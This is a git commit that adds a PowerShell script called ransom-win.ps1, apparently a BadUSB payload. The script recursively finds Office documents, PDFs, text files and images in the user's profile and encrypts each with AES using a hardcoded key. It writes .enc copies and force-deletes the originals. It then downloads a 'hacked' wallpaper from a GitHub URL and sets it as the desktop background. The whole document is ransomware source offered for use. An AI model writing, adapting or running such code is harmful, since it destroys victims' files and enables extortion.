300f4d86bdf2ca96be22fbd8db5f1506b39a9f02
Nina Kisyova <kisyova.nina@gmail.com>
2025-05-31 23:08:27 +0300

    Create ransom-win.ps1

---
+++ ransom-win.ps1
@@ -0,0 +1,40 @@
+# == Setup ==
+$root = $env:USERPROFILE
+$key = [Convert]::FromBase64String("c3VwZXJzZWNyZXRrZXlzZWNyZXRrZXlzZWNyZQ==")  
+$iv  = [Convert]::FromBase64String("aW5pdHZlY3Rvcg==")                          
+$wallpaperUrl = "https://raw.githubusercontent.com/ninakisyova/flipperzero-badUSB/main/hacked-wallpaper.png"
+# == Files to be encrypted ==
+$includeExtensions = @("*.doc","*.docx","*.xls","*.xlsx","*.ppt","*.pptx","*.pdf","*.txt","*.jpg","*.png")
+
+# == Encryption ==
+Get-ChildItem -Path $root -Recurse -Include $includeExtensions -File -ErrorAction SilentlyContinue | ForEach-Object {
+    try {
+        $data = [IO.File]::ReadAllBytes($_.FullName)
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Key = $key
+        $aes.IV = $iv
+        $encryptor = $aes.CreateEncryptor()
+        $ms = New-Object IO.MemoryStream
+        $cs = New-Object Security.Cryptography.CryptoStream($ms, $encryptor, 'Write')
+        $cs.Write($data, 0, $data.Length)
+        $cs.Close()
+        $enc = $ms.ToArray()
+        [IO.File]::WriteAllBytes("$($_.FullName).enc", $enc)
+        Remove-Item $_.FullName -Force
+    } catch {
+        continue
+    }
+}
+
+# == Wallpaper ==
+$localWallpaper = "$env:TEMP\hacked-wallpaper.png"
+Invoke-WebRequest -Uri $wallpaperUrl -OutFile $localWallpaper
+$code = @"
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+Add-Type $code
+[Wallpaper]::SystemParametersInfo(20, 0, $localWallpaper, 3)
